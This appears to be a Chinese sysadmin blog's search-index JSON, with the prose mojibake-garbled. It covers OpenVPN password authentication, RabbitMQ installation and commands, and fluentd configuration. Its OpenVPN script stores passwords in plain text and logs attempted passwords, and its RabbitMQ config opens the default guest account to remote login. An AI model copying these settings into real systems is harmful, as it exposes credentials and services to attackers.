13:45","objectID":"/post/1782/:1:0","tags":[],"title":"ä¸€é”®å®‰è£…openvpnå¹¶é…ç½®ä½¿ç”¨è´¦å·å¯†ç ç™»é™†","uri":"/post/1782/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"é…ç½®ä½¿ç”¨è´¦å·å¯†ç éªŒè¯ 1.åˆ›å»ºè„šæœ¬:vim /etc/openvpn/checkpsw.sh #!/bin/sh ########################################################### # checkpsw.sh (C) 2004 Mathias Sundman \u003cmathias@openvpn.se\u003e # # This script will authenticate OpenVPN users against # a plain text file. The passfile should simply contain # one row per user with the username first followed by # one or more space(s) or tab(s) and then the password. PASSFILE=\"/etc/openvpn/psw-file\" LOG_FILE=\"/etc/openvpn/openvpn-password.log\" TIME_STAMP=`date \"+%Y-%m-%d %T\"` ########################################################### if [ ! -r \"${PASSFILE}\" ]; then echo \"${TIME_STAMP}: Could not open password file \\\"${PASSFILE}\\\" for reading.\" \u003e\u003e ${LOG_FILE} exit 1 fi CORRECT_PASSWORD=`awk '!/^;/\u0026\u0026!/^#/\u0026\u0026$1==\"'${username}'\"{print $2;exit}' ${PASSFILE}` if [ \"${CORRECT_PASSWORD}\" = \"\" ]; then echo \"${TIME_STAMP}: User does not exist: username=\\\"${username}\\\", password=\\\"${password}\\\".\" \u003e\u003e ${LOG_FILE} exit 1 fi if [ \"${password}\" = \"${CORRECT_PASSWORD}\" ]; then echo \"${TIME_STAMP}: Successful authentication: username=\\\"${username}\\\".\" \u003e\u003e ${LOG_FILE} exit 0 fi echo \"${TIME_STAMP}: Incorrect password: username=\\\"${username}\\\", password=\\\"${password}\\\".\" \u003e\u003e ${LOG_FILE} exit 1 2.æ·»åŠ æƒé™ chmod 755 /etc/openvpn/checkpsw.sh 3.æ·»åŠ è´¦å·å¯†ç  echo 'username1 password1' \u003e\u003e /etc/openvpn/psw-file 4.ä¿®æ”¹server.conf # è¿½åŠ ä»¥ä¸‹å†…å®¹ script-security 3 auth-user-pass-verify /etc/openvpn/checkpsw.sh via-env username-as-common-name verify-client-cert none 5.é‡å¯æœåŠ¡ systemctl restart openvpn-server@server 6.ä¿®æ”¹å®¢æˆ·ç«¯æ–‡ä»¶soul.ovpn # è¿½åŠ ä»¥ä¸‹å†…å®¹,\u003ccert\u003eå’Œ\u003ckey\u003eéƒ¨åˆ†å¯ä»¥åˆ æ‰ auth-user-pass å®¢æˆ·ç«¯å¡«å†™ç”¨æˆ·åå¯†ç  20302-ekztnpyyhjj.png ","date":"2020-06-15 13:45","objectID":"/post/1782/:2:0","tags":[],"title":"ä¸€é”®å®‰è£…openvpnå¹¶é…ç½®ä½¿ç”¨è´¦å·å¯†ç ç™»é™†","uri":"/post/1782/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä½¿ç”¨application-test.yml, java -Dspring.profiles.active=test -jar xxx.jar java -Dspring.config.location=./application.yml -jar xxx.jar ","date":"2020-06-05 17:13","objectID":"/post/2446/:0:0","tags":[],"title":"SpringBootå¯åŠ¨æ—¶åŠ è½½æœ¬åœ°é…ç½®æ–‡ä»¶","uri":"/post/2446/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.rabbitmq.com/rabbitmqctl.8.html ","date":"2020-06-04 14:11","objectID":"/post/1774/:0:0","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(äºŒ)-rabbitmqctl","uri":"/post/1774/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‘½ä»¤æ ¼å¼ rabbitmqctl [-q] [-s] [-l] [-n node] [-t timeout] command [command_options] ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(äºŒ)-rabbitmqctl","uri":"/post/1774/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‚æ•°é€‰é¡¹ï¼š -nï¼šæŒ‡å®šnodeèŠ‚ç‚¹åç§° -qï¼šé™é»˜è¾“å‡ºï¼Œå‡å°‘ä¿¡æ¯è¾“å‡º -s: é™é»˜è¾“å‡ºï¼Œå‡å°‘ä¿¡æ¯è¾“å‡ºå¹¶æŠ‘åˆ¶è¡¨æ ‡å¤´ã€‚ â€“no-table-headersï¼šä¸è¾“å‡ºè¡¨æ ¼æ•°æ®çš„æ ‡é¢˜ â€“dry-runï¼šå°è¯•è¿è¡Œï¼Œä¸ä¼šçœŸæ­£çš„è¿è¡Œ -tï¼šè¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤æ— é™ ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:1","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(äºŒ)-rabbitmqctl","uri":"/post/1774/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¸¸ç”¨å‘½ä»¤é€‰é¡¹ï¼š ç”¨æˆ·ç®¡ç†ï¼š æ·»åŠ ç”¨æˆ·ï¼šrabbitmqctl add_user \u003cusername\u003e \u003cpassword\u003e ä¿®æ”¹å¯†ç ï¼šrabbitmqctl change_password \u003cusername\u003e \u003cnewpass\u003e åˆ é™¤ç”¨æˆ·ï¼šrabbitmqctl delete_user \u003cusername\u003e ç”¨æˆ·åˆ—è¡¨ï¼šrabbitmqctl list_users è®¾ç½®ç”¨æˆ·è§’è‰²ï¼šrabbitmqctl set_user_tags \u003cusername\u003e \u003ctag1,tag2\u003e åˆ é™¤ç”¨æˆ·æ‰€æœ‰è§’è‰²ï¼šrabbitmqctl set_user_tags \u003cusername\u003e è§’è‰²è¯´æ˜ï¼š management ç”¨æˆ·å¯ä»¥è®¿é—®managementæ’ä»¶ policymaker ç”¨æˆ·å¯ä»¥è®¿é—®managementæ’ä»¶ï¼Œå¹¶ç®¡ç†ä»–ä»¬æœ‰æƒè®¿é—®çš„vhostçš„ç­–ç•¥å’Œå‚æ•°ã€‚ monitoring ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡ç†æ’ä»¶ï¼ŒæŸ¥çœ‹æ‰€æœ‰è¿æ¥å’Œé€šé“ä»¥åŠä¸èŠ‚ç‚¹ç›¸å…³çš„ä¿¡æ¯ã€‚ administrator æ‰€æœ‰æƒé™ è®¿é—®æ§åˆ¶ åˆ é™¤ç”¨æˆ·è®¿é—®è™šæ‹Ÿä¸»æœºæƒé™ï¼šrabbitmqctl clear_permissions -p \u003cvhost\u003e \u003cusername\u003e æŸ¥çœ‹è™šæ‹Ÿä¸»æœºå¯¹åº”ç”¨æˆ·çš„æƒé™ï¼šrabbitmqctl list_permissions -p \u003cvhost\u003e æŸ¥çœ‹ç”¨æˆ·æ‹¥æœ‰å“ªäº›è™šæ‹Ÿä¸»æœºçš„æƒé™ï¼šrabbitmqctl list_user_permissions \u003cusername\u003e æŸ¥çœ‹æ‰€æœ‰è™šæ‹Ÿä¸»æœºrabbitmqctl list_vhosts name tracing ç»™ç”¨æˆ·è®¾ç½®è™šæ‹Ÿä¸»æœºçš„æƒé™ï¼šrabbitmqctl set_permissions -p \u003cvhost\u003e \u003cusername\u003e \".*\" \".*\" \".*\" æƒé™ç±»å‹ï¼š Configureï¼šåˆ›å»ºä¸é”€æ¯èµ„æº Writeï¼šå†™å…¥èµ„æº Readï¼šè¯»å–èµ„æº ","date":"2020-06-04 14:11","objectID":"/post/1774/:1:2","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(äºŒ)-rabbitmqctl","uri":"/post/1774/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æœåŠ¡å¯ç”¨ç®¡ç† # å¯åŠ¨ rabbitmq-server -detached # å…³é—­ rabbitmqctl stop ","date":"2020-06-04 13:35","objectID":"/post/1772/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(ä¸€)-plugins","uri":"/post/1772/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ’ä»¶ç›¸å…³ ###1. list -v æ˜¾ç¤ºæ‰€æœ‰æ’ä»¶çš„è¯¦æƒ…ï¼ˆè¯¦ç»†ï¼‰ -m ä»…ä»…åªæ˜¾ç¤ºæ’ä»¶çš„åç§° (ç®€çº¦) -E ä»…ä»…åªæ˜¾ç¤ºæ˜¾å¼å¯ç”¨çš„æ’ä»¶ -e ä»…ä»…åªæ˜¾ç¤ºæ˜¾å¼ã€éšå¼å¯ç”¨çš„æ’ä»¶ è¡¨ç¤ºç”¨äºè¿‡æ»¤æ’ä»¶åç§°è¡¨è¾¾å¼ # æ˜¾ç¤ºæ‰€æœ‰çš„æ’ä»¶ï¼Œæ¯ä¸€è¡Œä¸€ä¸ª rabbitmq-plugins list # æ˜¾ç¤ºæ‰€æœ‰çš„æ’ä»¶ï¼Œå¹¶ä¸”æ˜¾ç¤ºæ’ä»¶çš„ç‰ˆæœ¬å·å’Œæè¿°ä¿¡æ¯ rabbitmq-plugins list -v # æ˜¾ç¤ºæ‰€æœ‰åç§°å«æœ‰ \"management\" çš„æ’ä»¶ rabbitmq-plugins list -v management # æ˜¾ç¤ºæ‰€æœ‰æ˜¾ç¤ºæˆ–è€…éšå¼å¯åŠ¨çš„æ’ä»¶ rabbitmq-plugins list -e rabbit ###2. enable \u0026 disable \u0026 set â€“offline ä»…ä»…ä¿®æ”¹å¯åŠ¨çš„æ’ä»¶æ–‡ä»¶ â€“online å°†ä¸æ­£åœ¨è¿è¡Œçš„ä»£ç†è¿æ¥å¤±è´¥è§†ä¸ºè‡´å‘½é”™è¯¯ ä¸€ä¸ªæˆ–å¤šä¸ªæ’ä»¶åç§° # å¯ç”¨æŒ‡å®šæ’ä»¶ rabbitmq-plugins enable # ç¦ç”¨æŒ‡å®šæ’ä»¶ rabbitmq-plugins disable # ç¦ç”¨æ‰€æœ‰æ’ä»¶ rabbitmq-plugins set # å¯ç”¨managementæ’ä»¶å’Œå®ƒæ‰€ä¾èµ–çš„æ’ä»¶ï¼Œç¦ç”¨å…¶ä»–æ‰€æœ‰æ’ä»¶ rabbitmq-plugins set rabbitmq_management ","date":"2020-06-04 13:35","objectID":"/post/1772/:2:0","tags":["mq","rabbitmq"],"title":"rabbitmqå¸¸ç”¨å‘½ä»¤è¡Œ(ä¸€)-plugins","uri":"/post/1772/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æœ¬æ–‡è½¬è‡ªï¼šhttps://www.cnblogs.com/zhming26/p/6140307.html ç®€å•çš„rabbitmqé…ç½®å¯æ— éœ€é…ç½®æ–‡ä»¶ï¼Œåªæœ‰éœ€è¦å®šåˆ¶å¤æ‚åº”ç”¨æ—¶ï¼Œæ‰éœ€è¦ç”¨åˆ°é…ç½®æ–‡ä»¶ rabbitmq-env.confé…ç½® å¸¸ç”¨å‚æ•°ï¼š RABBITMQ_NODE_IP_ADDRESS= //IPåœ°å€ï¼Œç©ºä¸²bindæ‰€æœ‰åœ°å€ï¼ŒæŒ‡å®šåœ°å€bindæŒ‡å®šç½‘ç»œæ¥å£ RABBITMQ_NODE_PORT= //TCPç«¯å£å·ï¼Œé»˜è®¤æ˜¯5672 RABBITMQ_NODENAME= //èŠ‚ç‚¹åç§°ã€‚é»˜è®¤æ˜¯rabbit RABBITMQ_CONFIG_FILE= //é…ç½®æ–‡ä»¶è·¯å¾„ ï¼Œå³rabbitmq.configæ–‡ä»¶è·¯å¾„ RABBITMQ_MNESIA_BASE= //mnesiaæ‰€åœ¨è·¯å¾„ RABBITMQ_LOG_BASE= //æ—¥å¿—æ‰€åœ¨è·¯å¾„ RABBITMQ_PLUGINS_DIR= //æ’ä»¶æ‰€åœ¨è·¯å¾„ rabbitmq.configé…ç½® å¦‚æœæ˜¯ç”¨rpmåŒ…å®‰è£…ï¼Œå¯ä»é»˜è®¤docsç›®å½•å¤åˆ¶é…ç½®æ–‡ä»¶æ ·ä¾‹ï¼š cp /usr/share/doc/rabbitmq-server-3.6.5/rabbitmq.config.example /etc/rabbitmq.config tcp_listerners #è®¾ç½®rabbimqçš„ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ä¸º[5672]ã€‚ disk_free_limit #ç£ç›˜ä½æ°´ä½çº¿ï¼Œè‹¥ç£ç›˜å®¹é‡ä½äºæŒ‡å®šå€¼åˆ™åœæ­¢æ¥æ”¶æ•°æ®ï¼Œé»˜è®¤å€¼ä¸º{mem_relative, 1.0},å³ä¸å†…å­˜ç›¸å…³è”1ï¼š1ï¼Œä¹Ÿå¯å®šåˆ¶ä¸ºå¤šå°‘byte. vm_memory_high_watermark #è®¾ç½®å†…å­˜ä½æ°´ä½çº¿ï¼Œè‹¥ä½äºè¯¥æ°´ä½çº¿ï¼Œåˆ™å¼€å¯æµæ§æœºåˆ¶ï¼Œé»˜è®¤å€¼æ˜¯0.4ï¼Œå³å†…å­˜æ€»é‡çš„40%ã€‚ hipe_compile #å°†éƒ¨åˆ†rabbimqä»£ç ç”¨High Performance Erlang compilerç¼–è¯‘ï¼Œå¯æå‡æ€§èƒ½ï¼Œè¯¥å‚æ•°æ˜¯å®éªŒæ€§ï¼Œè‹¥å‡ºç°erlang vm segfaultsï¼Œåº”å…³æ‰ã€‚ force_fine_statistics #è¯¥å‚æ•°å±äºrabbimq_managementï¼Œè‹¥ä¸ºtrueåˆ™è¿›è¡Œç²¾ç»†åŒ–çš„ç»Ÿè®¡ï¼Œä½†ä¼šå½±å“æ€§èƒ½ã€‚ frame_max #åŒ…å¤§å°ï¼Œè‹¥åŒ…å°åˆ™ä½å»¶è¿Ÿï¼Œè‹¥åŒ…åˆ™é«˜ååï¼Œé»˜è®¤æ˜¯131072=128Kã€‚ heartbeat #å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å¿ƒè·³é—´éš”ï¼Œè®¾ç½®ä¸º0åˆ™å…³é—­å¿ƒè·³ï¼Œé»˜è®¤æ˜¯600ç§’ã€‚ ","date":"2020-06-04 11:04","objectID":"/post/1770/:0:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5å¸¸ç”¨é…ç½®","uri":"/post/1770/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£…erlang-19.3ç¯å¢ƒ erlangå’Œrabbitmqç‰ˆæœ¬å¯¹åº”å…³ç³» # å®‰è£…ä¾èµ– yum -y install make gcc gcc-c++ kernel-devel m4 ncurses-devel openssl-devel unixODBC-devel # å®‰è£…erlang19.3 wget http://erlang.org/download/otp_src_19.3.tar.gz tar xf otp_src_19.3.tar.gz cd otp_src_19.3/ ./configure --prefix=/usr/local/erlang --with-ssl -enable-threads -enable-smmp-support -enable-kernel-poll --enable-hipe --without-javac make \u0026\u0026 make install #é…ç½®ç¯å¢ƒå˜é‡ vim /etc/profile export ERL_HOME=/usr/local/erlang export PATH=$PATH:$ERL_HOME/bin ç¼–è¯‘åå¯èƒ½ä¼šå‡ºç°ä¸‹é¢çš„ä¿¡æ¯ï¼Œç¼ºå°‘wxWidgetsåº“ï¼Œè¿™ä¸ªåº“æ˜¯ç”¨äºå›¾å½¢åŒ–ç•Œé¢çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¿½ç•¥äº† wx : wxWidgets not found, wx will NOT be usable ç¼–è¯‘å‚æ•°è¯´æ˜ï¼š â€“with-sslï¼šä½¿ç”¨ssl -enable-threadsï¼šå¯ç”¨å¼‚æ­¥çº¿ç¨‹ -enable-smp-supportï¼šå¯ç”¨å¯¹ç§°å¤šå¤„ç† -enable-kernel-pollï¼šå¯ç”¨kernel-pollåœ¨æœ‰å¾ˆå¤šè¿æ¥æ—¶ï¼Œå¯ä»¥æå¤§çš„é™ä½CPUçš„å ç”¨ç‡ â€“enable-hipeï¼šå¯ç”¨hipeå¯ä»¥æå‡è®¡ç®—é€Ÿåº¦ â€“without-javacï¼šä½¿ç”¨javacç¼–è¯‘ ","date":"2020-06-04 08:56","objectID":"/post/1766/:1:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5äºŒè¿›åˆ¶å®‰è£…","uri":"/post/1766/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£…rabbitmq-3.6.5 å®‰è£… wget https://www.rabbitmq.com/releases/rabbitmq-server/v3.6.5/rabbitmq-server-generic-unix-3.6.5.tar.xz tar xf rabbitmq-server-generic-unix-3.6.5.tar.xz mv rabbitmq_server-3.6.5 /usr/local/rabbitmq_server åˆ›å»ºé…ç½®æ–‡ä»¶ ä¸‹é¢ä½¿ç”¨çš„æ˜¯ç»å…¸é…ç½®æ ¼å¼ï¼Œ3.7ä»¥ä¸Šå¯ä»¥ä½¿ç”¨æ–°æ ¼å¼k=vå½¢å¼çš„ vim /usr/local/rabbitmq_server/etc/rabbitmq/rabbitmq.config [ {rabbit, [ {tcp_listeners, [5672]}, %% é»˜è®¤æƒ…å†µä¸‹guestç”¨æˆ·åªèƒ½ä½¿ç”¨æœ¬åœ°è®¿é—®ï¼Œè¿™é‡ŒæŠŠæœ¬åœ°ç”¨æˆ·åˆ—è¡¨æ¸…ç©º {loopback_users,[]} ] } ]. å¯åŠ¨rabbitmq cd /usr/local/rabbitmq_server/sbin/ # å¯åŠ¨ ./rabbitmq-server -detached # åœæ­¢ ./rabbitmqctl stop å¯ç”¨rabbitmq_managementæ’ä»¶ # æŸ¥çœ‹æ’ä»¶åˆ—è¡¨ ./rabbitmq-plugins list # å¯ç”¨æ’ä»¶ ./rabbitmq-plugins enable rabbitmq_management ç«¯å£è¯´æ˜ï¼š rabbitmqçš„ç«¯å£æ˜¯5672 rabbitmq_managementæ’ä»¶çš„ç«¯å£æ˜¯15672 æ‰“å¼€webé¡µé¢ ip:15672ï¼Œé»˜è®¤è´¦å·å¯†ç æ˜¯guest ","date":"2020-06-04 08:56","objectID":"/post/1766/:2:0","tags":["mq","rabbitmq"],"title":"rabbitmq3.6.5äºŒè¿›åˆ¶å®‰è£…","uri":"/post/1766/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"##å‚æ•° @type (å¿…é¡») æŒ‡å®šæ’ä»¶ host (å¯é€‰) esä¸»æœºåœ°å€ï¼Œé»˜è®¤localhost port (å¯é€‰) esç«¯å£ï¼Œé»˜è®¤9200 hosts (å¯é€‰) å¦‚æœæ˜¯é›†ç¾¤ï¼ŒæŒ‡å®šå¤šä¸ªåœ°å€å’Œç«¯å£ï¼Œå¦‚æœä½¿ç”¨æ­¤é€‰é¡¹ï¼Œåˆ™å¿½ç•¥hostå’Œporté€‰é¡¹ã€‚é…ç½®æ ¼å¼å¦‚ä¸‹ï¼š hosts host1:port1,host2:port2,host3:port3 # or hosts https://customhost.com:443/path,https://username:password@host-failover.com:443 user, password (å¯é€‰) esçš„ç™»é™†å‡­è¯ user fluent password mysecret scheme (å¯é€‰) æŒ‡å®šåè®®ï¼Œé»˜è®¤http path (å¯é€‰) restapiç”¨äºå‘å‡ºå†™è¯·æ±‚çš„è·¯å¾„(é»˜è®¤å€¼: nil) index_name (å¯é€‰) esç´¢å¼•åç§°ï¼Œé»˜è®¤fluentd # æ”¯æŒä½¿ç”¨å ä½ç¬¦ index_name fluentd.${tag} # å¯ä»¥ä½¿ç”¨åŠ¨æ€çš„æ—¶é—´å ä½ç¬¦ ndex_name fluentd.${tag}.%Y%m%d # è¦ä½¿ç”¨å ä½ç¬¦éœ€è¦åœ¨åŒºå—é”®ä¸­è®¾ç½®tagå’Œtimeé”®ã€‚è¿˜éœ€è¦ä¸ºç¼“å†²å—çš„æ—¶é—´ç‰‡æŒ‡å®štimekey \u003cbuffer tag, time\u003e timekey 1h # chunks per hours (\"3600\" also available) \u003c/buffer\u003e logstash_format (å¯é€‰) è®¾ç½®ä¸ºtrueåï¼ŒFluentdä½¿ç”¨ä¼ ç»Ÿçš„ç´¢å¼•åæ ¼å¼logstash-%Y.%m.%d(é»˜è®¤å€¼: false)ã€‚ æ­¤é€‰é¡¹å–ä»£index_nameé€‰é¡¹ã€‚ @log_leve (å¯é€‰) æ—¥å¿—çº§åˆ«ï¼Œæ”¯æŒfatal,error,warn,info,debug,trace. logstash_prefix (optional) ç´¢å¼•çš„å‰ç¼€ï¼Œé»˜è®¤logstash ","date":"2020-06-02 09:28","objectID":"/post/1762/:0:0","tags":["elasticsearch","elk","efk"],"title":"fluentdä½¿ç”¨esæ’ä»¶ä½œä¸ºè¾“å‡º","uri":"/post/1762/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"é…ç½®æ–‡ä»¶ \u003csource\u003e @type http port 8888 \u003c/source\u003e \u003cmatch **\u003e @type elasticsearch host \"localhost\" port 9200 index_name \"fluentd.${tag}.%Y%m%d\" \u003cbuffer tag,time\u003e timekey 60s flush_mode interval flush_interval 10 \u003c/buffer\u003e \u003c/match\u003e å¯åŠ¨æœåŠ¡td-agent -c demo3.conf å‘é€æ—¥å¿—æµ‹è¯•ï¼šcurl localhost:8888/test1 -d 'json={\"aaa\":\"bbb\"}' ç­‰å¾…10ç§’åï¼Œç´¢å¼•å·²ç»è¢«åˆ›å»ºäº† 71568-kvzlvbpuwh.png ","date":"2020-06-02 09:28","objectID":"/post/1762/:1:0","tags":["elasticsearch","elk","efk"],"title":"fluentdä½¿ç”¨esæ’ä»¶ä½œä¸ºè¾“å‡º","uri":"/post/1762/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"formatéƒ¨åˆ†å¯ä»¥ä½äºæˆ–éƒ¨åˆ†ä¸­ã€‚ ","date":"2020-06-01 13:47","objectID":"/post/1752/:0:0","tags":["elk"],"title":"fluentdæ ¼å¼åŒ–formatï¼ˆå…­ï¼‰","uri":"/post/1752/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"æ’ä»¶ç±»å‹ formatéƒ¨åˆ†éœ€è¦@typeå‚æ•°æ¥æŒ‡å®šæ ¼å¼åŒ–ç¨‹åºæ’ä»¶çš„ç±»å‹ã€‚ fluentdå†…ç½®äº†ä¸€äº›æœ‰ç”¨çš„æ ¼å¼åŒ–ç¨‹åºæ’ä»¶ã€‚å®‰è£…ç¬¬ä¸‰æ–¹æ’ä»¶æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ \u003cformat\u003e @type json \u003c/format\u003e ä¸‹é¢æ˜¯ä¸€äº›å†…ç½®çš„æ ¼å¼åŒ–æ’ä»¶ï¼š out_file json ltsv csv msgpack hash single_value ","date":"2020-06-01 13:47","objectID":"/post/1752/:1:0","tags":["elk"],"title":"fluentdæ ¼å¼åŒ–formatï¼ˆå…­ï¼‰","uri":"/post/1752/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"å‚æ•°ï¼š @typeï¼šæŒ‡å®šæ’ä»¶ç±»å‹ ","date":"2020-06-01 13:47","objectID":"/post/1752/:2:0","tags":["elk"],"title":"fluentdæ ¼å¼åŒ–formatï¼ˆå…­ï¼‰","uri":"/post/1752/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"æ—¶é—´å‚æ•° time_typeï¼šæ—¶é—´ç±»å‹ é»˜è®¤å€¼ï¼šfloat å¯é€‰å€¼ï¼šfloat, unixtime, string float: çºªå…ƒ+çº³ç§’(ä¾‹å¦‚:1510544836.154709804) unixtime: çºªå…ƒ(ä¾‹å¦‚:1510544815) string: ä½¿ç”¨ç”±time_formatã€æœ¬åœ°æ—¶é—´æˆ–æ—¶åŒºæŒ‡å®šçš„æ ¼å¼ time_formatï¼šæ—¶é—´æ ¼å¼ é»˜è®¤å€¼ï¼šnil localtimeï¼šå¦‚æœä¸ºçœŸï¼Œä½¿ç”¨æœ¬åœ°æ—¶é—´ã€‚å¦åˆ™ï¼Œä½¿ç”¨ UTC é»˜è®¤å€¼ï¼štrue utcï¼šå¦‚æœä¸ºçœŸï¼Œä½¿ç”¨UTCã€‚å¦åˆ™ï¼Œä½¿ç”¨æœ¬åœ°æ—¶é—´ é»˜è®¤å€¼ï¼šfalse timezoneï¼šæŒ‡å®šæ—¶åŒº é»˜è®¤å€¼ï¼šnil å¯ç”¨çš„æ—¶åŒºæ ¼å¼ï¼š [+-]HH:MM(ä¾‹å¦‚:+09:00) [+-]HHMM(ä¾‹å¦‚:+0900) [+-]HH(ä¾‹å¦‚:+09) Region/Zone(ä¾‹å¦‚:Asia/Tokyo) Region/Zone/Zone(ä¾‹å¦‚:America/Argentina/Buenos_Aires) ","date":"2020-06-01 13:47","objectID":"/post/1752/:3:0","tags":["elk"],"title":"fluentdæ ¼å¼åŒ–formatï¼ˆå…­ï¼‰","uri":"/post/1752/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"jsonæ’ä»¶ä¸¾ä¾‹ï¼š jsonæ ¼å¼åŒ–æ’ä»¶å°†äº‹ä»¶è½¬æ¢ä¸ºjsonã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œjsonæ ¼å¼åŒ–ç¨‹åºç»“æœä¸åŒ…å«æ ‡ç­¾å’Œæ—¶é—´å­—æ®µã€‚ å¯ç”¨å‚æ•°ï¼š é€šç”¨å‚æ•° formatå‚æ•° add_newline: åœ¨ç»“æœä¸­æ·»åŠ \\n é»˜è®¤å€¼ï¼štrue ä¸‹é¢çš„é…ç½®æ˜¯ä»/var/log/test.logæ–‡ä»¶ä¸­è¯»å–å†…å®¹ï¼Œå¹¶é€šè¿‡stdoutæ’ä»¶æ‰“å°åˆ°å±å¹•ä¸­ æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹ä¸ä½¿ç”¨formatçš„æ˜¾ç¤ºç»“æœ \u003csource\u003e @type tail tag test.aa path /var/log/test.log pos_file /tmp/test.log.pos \u003cparse **\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch **\u003e @type stdout # \u003cformat\u003e # @type json # add_newline false # \u003c/format\u003e \u003c/match\u003e æ¨¡æ‹Ÿç”Ÿæˆæ—¥å¿—ï¼šecho 'test line 1' \u003e\u003e /var/log/test.log 19451-utsp60u6qw.png \u003csource\u003e @type tail tag test.aa path /var/log/test.log pos_file /tmp/test.log.pos \u003cparse **\u003e @type none \u003c/parse\u003e \u003c/source\u003e \u003cmatch test.**\u003e @type stdout \u003cformat\u003e @type json add_newline false \u003c/format\u003e \u003c/match\u003e å¯åŠ¨æœåŠ¡td-agent -c demo2.conf æ¨¡æ‹Ÿç”Ÿæˆæ—¥å¿—ï¼šecho 'test line 1' \u003e\u003e /var/log/test.log,å¯ä»¥çœ‹åˆ°æ—¥å¿—åªä¿ç•™äº†jsonæ ¼å¼çš„éƒ¨åˆ† 72820-tetd7qoj5d.png ","date":"2020-06-01 13:47","objectID":"/post/1752/:4:0","tags":["elk"],"title":"fluentdæ ¼å¼åŒ–formatï¼ˆå…­ï¼‰","uri":"/post/1752/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"bufferåŒºå—å¿…é¡»ä½äºmatchåŒºå—å†…ï¼ŒæŒ‡å®šå¦‚ä½•å¯¹äº‹ä»¶è¿›è¡Œç¼“å†²ï¼ˆé¿å…å¯¹è¾“å‡ºçš„ç›®çš„åœ°é€ æˆå‹åŠ›ï¼‰ã€‚Fluentdå†…ç½®äº†ä¸¤ç§ç¼“å†²æ’ä»¶ï¼šmemoryã€fileã€‚ bufferåŒºå—ä½¿ç”¨@type å‚æ•°æ¥æŒ‡å®šç¼“å†²åŒºæ’ä»¶çš„ç±»å‹ï¼Œå¦‚æœçœç•¥@typeï¼Œå°†ä½¿ç”¨è¾“å‡ºæ’ä»¶æŒ‡å®šçš„é»˜è®¤ç¼“å†²åŒºæ’ä»¶ï¼Œæˆ–è€…ä½¿ç”¨memoryæ’ä»¶ã€‚ \u003cbuffer\u003e @type file \u003c/buffer\u003e ","date":"2020-05-29 18:29","objectID":"/post/1739/:0:0","tags":["elk","efk","fluentd"],"title":"fluentdç¼“å†²åŒºBufferï¼ˆäº”ï¼‰","uri":"/post/1739/"},{"categories":["ç³»ç»ŸæœåŠ¡","ELKæ—¥å¿—æ”¶é›†"],"content":"åŒºå—é”®ï¼š ä¸ºbufferæŒ‡å®šä¸€ä¸ªåŒºå—é”®ã€‚æœ‰æ•ˆçš„å€¼å¯ä»¥æ˜¯é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²æˆ–ç©ºå€¼ã€‚ ç©ºç™½åŒºå—é”®ï¼š å½“æŒ‡å®šäº†ç©ºçš„åŒºå—é”®(å¹¶ä¸”è¾“å‡ºæ’ä»¶æ²¡æœ‰æŒ‡å®šé»˜è®¤çš„åŒºå—é”®) ï¼Œè¾“å‡ºæ’ä»¶å°†æ‰€æœ‰åŒ¹é…çš„äº‹ä»¶å†™å…¥ä¸€ä¸ªbufferåŒºå—ä¸­ï¼Œç›´åˆ°å…¶å¤§å°æ»¡ä¸ºæ­¢ã€‚ \u003cmatch tag.**\u003e # ... \u003cbuffer\u003e # ... \u003c/buffer\u003e \u003c/match\u003e # No chunk keys: All events will be appended into the same chunk. 11:59:30 web.access {\"key1\":\"yay\",\"key2\":100} --| | 12:00:01 web.access {\"key1\":\"foo\",\"key2\":200} --|---\u003e CHUNK_A | 12:00:25 ssh.login {\"key1\":\"yay\",\"key2\":100} --| tagï¼š å½“tagè¢«æŒ‡å®šä¸ºç¼“å†²åŒºå—é”®æ—¶ï¼ŒåŒä¸€ä¸ªtagå¯¹åº”ä¸€ä¸ªç¼“å†²åŒºã€‚ \u003csource\u003e @type tail path /var/log/messages tag os.messages pos_file 